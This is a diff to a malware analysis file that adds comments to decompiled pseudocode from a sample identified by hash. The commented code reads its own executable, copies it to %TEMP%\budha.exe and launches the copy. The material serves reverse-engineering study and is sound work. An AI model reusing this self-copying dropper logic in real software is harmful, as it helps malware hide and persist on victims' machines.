@@ -17,14 +17,14 @@ Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e
   hFile = FileW; // hFile = Handle to itself
   if ( FileW == (HANDLE)-1 ) // If the handle creation failed..
     return 1; // Return 1 to the calling process 'failed'
-  nNumberOfBytesToRead = GetFileSize(FileW, 0);
+  nNumberOfBytesToRead = GetFileSize(FileW, 0); // Sets the nNumberOfBytesToRead to the file size of the file handle
   v3 = lstrlenW(v0);
   v4 = HeapAlloc(hHeap, 8u, nNumberOfBytesToRead + 2 * v3 + 4);
   v31 = v4;
   if ( !v4 )
-    ExitProcess(1u);
-  ReadFile(hFile, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
-  if ( lstrcmpW(v0, lpBuffer) )
+    ExitProcess(1u); // If memory allocation fails, exit process
+  ReadFile(hFile, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0); // Read the current executing process
+  if ( lstrcmpW(v0, lpBuffer) ) // Execute if statement only if the current executing process is not %TEMP%\budha.exe
   {
     v5 = lstrlenW(v0);
     sub_401000((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2);
@@ -32,11 +32,11 @@ Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e
     if ( hHeap == (HANDLE)-1 )
       return 1;
     v6 = lstrlenW(v0);
-    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0);
+    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0); // Write the current executing process to %TEMP%\budha.exe
     CloseHandle(hFile);
-    CloseHandle(hHeap);
+    CloseHandle(hHeap); // Close both handles to the current process
     GetTempPathW(0x1000u, v0);
-    ShellExecuteW(0, L"open", lpBuffer, 0, v0, 0);
+    ShellExecuteW(0, L"open", lpBuffer, 0, v0, 0); // Execute the new process under %TEMP%\budha.exe
 LABEL_8:
     ExitProcess(0);
   }
